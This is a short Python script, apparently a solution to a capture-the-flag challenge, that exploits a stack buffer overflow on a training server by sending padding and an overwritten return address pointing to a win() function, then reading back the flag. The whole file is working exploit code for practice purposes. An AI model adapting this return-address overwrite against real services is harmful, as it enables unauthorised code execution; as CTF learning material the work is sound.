"""
Echo_Escape_1 - ret2win over a raw socket (no pwntools).
Overflow main()'s 32-byte buffer, overwrite the return address with win().
"""
import socket
import sys

HOST = "chatelaine.cylabacademy.net"
PORT = 16319

WIN    = 0x401256          # address of win()  (from: nm vuln | grep win)
OFFSET = 40                # buf[32] + saved rbp(8)

# If it connects but you get nothing / a crash inside win(), uncomment the
# next line and set RET to a `ret` gadget address (stack-alignment fix).
RET = None                 # e.g. 0x40101a  -> find with: ROPgadget --binary vuln | grep ': ret'


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    payload = b"A" * OFFSET
    if RET is not None:
        payload += RET.to_bytes(8, "little")
    payload += WIN.to_bytes(8, "little")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    print(f"[*] connecting to {host}:{port}")
    s.connect((host, port))

    # read until the "name:" prompt
    banner = b""
    while b"name:" not in banner:
        chunk = s.recv(4096)
        if not chunk:
            break
        banner += chunk
    sys.stdout.write(banner.decode(errors="replace"))

    print(f"[*] sending payload ({len(payload)} bytes)")
    s.sendall(payload)

    # read the response (the flag)
    s.settimeout(3)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass

    print("[*] response:")
    print(out.decode(errors="replace"))

    s.close()


if __name__ == "__main__":
    main()
